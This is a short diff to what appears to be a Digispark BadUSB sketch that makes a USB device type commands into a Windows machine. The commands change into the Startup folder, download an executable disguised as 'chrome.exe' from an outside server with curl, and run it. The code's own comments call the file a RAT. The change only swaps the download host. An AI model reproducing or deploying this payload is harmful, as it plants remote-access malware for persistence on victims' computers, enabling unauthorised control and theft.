@@ -37,7 +37,7 @@ void setup() {
   DigiKeyboard.delay(500);// Wate for write command
   DigiKeyboard.println("cd Microsoft\\Windows\\Start Menu\\Programs\\Startup"); // go to startup folder
   DigiKeyboard.delay(600); // Wate for write command
-  DigiKeyboard.println("curl https://darsmanco.ir/media/files/chrome.exe --output chrome.exe"); // download RAT file
+  DigiKeyboard.println("curl https://sorenshamlou.ir/media/files/chrome.exe --output chrome.exe"); // download RAT file
   DigiKeyboard.delay(60000); // Wate for download RAT file
   DigiKeyboard.println("chrome.exe"); // Run RAT file
   DigiKeyboard.delay(1500); // Wate for run RAT app
